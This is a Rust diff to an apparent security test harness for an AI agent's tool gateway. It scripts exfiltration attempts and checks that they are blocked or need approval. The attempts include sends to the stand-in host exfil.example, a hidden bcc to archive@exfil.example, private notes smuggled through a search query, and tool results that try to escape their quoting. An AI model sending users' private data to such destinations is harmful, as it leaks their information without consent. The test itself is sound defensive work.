@@ -170,7 +170,7 @@ async fn scripted() -> Value {
         json!({ "to": "https://exfil.example/collect?d=4,000 from Goa", "text": "x" }),
         json!({ "to": ["archive@exfil.example"], "text": notes }),
     ] {
-        let (_, outcome) = connected::execute(&gw, send, &args.to_string(), "Search the docs for the deployment steps.", "Asha", false).await;
+        let (_, outcome) = connected::execute(&gw, send, &args.to_string(), "Search the docs for the deployment steps.", "Asha", false, &|_| Ok(())).await;
         attempts.push(json!({ "attempt": "exfiltrate", "args": args, "ok": outcome.ok, "result": outcome.result }));
     }
     // 4: a destination that isn't text (it can't be checked against anything), and a
@@ -179,7 +179,7 @@ async fn scripted() -> Value {
         ("numeric destination", json!({ "to": 4_000_123, "text": notes })),
         ("undeclared argument", json!({ "to": "neha@acme.in", "text": "Steps attached.", "bcc": "archive@exfil.example" })),
     ] {
-        let (_, outcome) = connected::execute(&gw, send, &args.to_string(), "Email neha@acme.in the deployment steps.", "Asha", false).await;
+        let (_, outcome) = connected::execute(&gw, send, &args.to_string(), "Email neha@acme.in the deployment steps.", "Asha", false, &|_| Ok(())).await;
         attempts.push(json!({ "attempt": attempt, "args": args, "ok": outcome.ok, "result": outcome.result }));
     }
     // 5: exfiltration through a read-only tool's query, after a private read: the
@@ -188,15 +188,15 @@ async fn scripted() -> Value {
     let before = gw.asked.lock().expect("asked").len();
     gw.decline.store(true, std::sync::atomic::Ordering::Relaxed);
     let query = json!({ "query": notes });
-    let (_, smuggled) = connected::execute(&gw, search, &query.to_string(), "Search the docs for the deployment steps.", "Asha", true).await;
+    let (_, smuggled) = connected::execute(&gw, search, &query.to_string(), "Search the docs for the deployment steps.", "Asha", true, &|_| Ok(())).await;
     gw.decline.store(false, std::sync::atomic::Ordering::Relaxed);
     let query_needed_approval = gw.asked.lock().expect("asked").len() > before;
     attempts.push(json!({ "attempt": "query after a private read", "args": query, "ok": smuggled.ok, "result": smuggled.result, "needed_approval": query_needed_approval }));
     // 6: a read whose result tries to break out of its quote and hide text.
-    let (_, read) = connected::execute(&gw, search, r#"{"query": "deployment"}"#, "", "Asha", false).await;
+    let (_, read) = connected::execute(&gw, search, r#"{"query": "deployment"}"#, "", "Asha", false, &|_| Ok(())).await;
     let broke_out = read.result.contains(">>>") || read.result.contains("<<<") || read.result.contains('\u{202E}');
     // 7: a flood.
-    let (_, flood) = connected::execute(&gw, search, r#"{"query": "FLOOD"}"#, "", "Asha", false).await;
+    let (_, flood) = connected::execute(&gw, search, r#"{"query": "FLOOD"}"#, "", "Asha", false, &|_| Ok(())).await;
     let log = log.lock().expect("log");
     let stopped = |a: &Value| a["ok"] == false && ["Blocked", "Not run", "Declined"].iter().any(|p| a["result"].as_str().unwrap_or_default().starts_with(p));
     json!({
